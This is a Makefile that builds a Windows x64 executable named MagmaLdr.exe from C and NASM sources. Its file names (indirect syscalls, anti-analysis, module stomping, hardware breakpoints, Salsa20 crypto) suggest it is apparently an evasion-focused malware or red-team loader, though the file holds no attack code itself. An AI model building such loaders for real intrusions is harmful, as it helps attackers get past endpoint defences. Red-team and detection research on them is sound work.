ASM = "C:/Program Files/NASM/nasm.exe"
ASMFLAGS = -f win64

CC = x86_64-w64-mingw32-gcc
CFLAGS = -Wall -Iinclude -Ilib

TARGET = MagmaLdr.exe

C_SOURCES = src/Main.c src/Syscalls.c src/AntiAnalysis.c src/Crypto.c src/Debug.c src/Stomp.c src/Utils.c src/Enum.c src/HWBP.c lib/Salsa20.c
ASM_SRC = src/IndirectSyscalls.asm
ASM_OBJ = src/IndirectSyscalls.o

all: $(ASM_OBJ)
	$(CC) $(CFLAGS) -o $(TARGET) $(C_SOURCES) $(ASM_OBJ)

$(ASM_OBJ): $(ASM_SRC)
	$(ASM) $(ASMFLAGS) $(ASM_SRC) -o $(ASM_OBJ)
	
clean:
	rm -f $(TARGET) $(ASM_OBJ)

.PHONY: all clean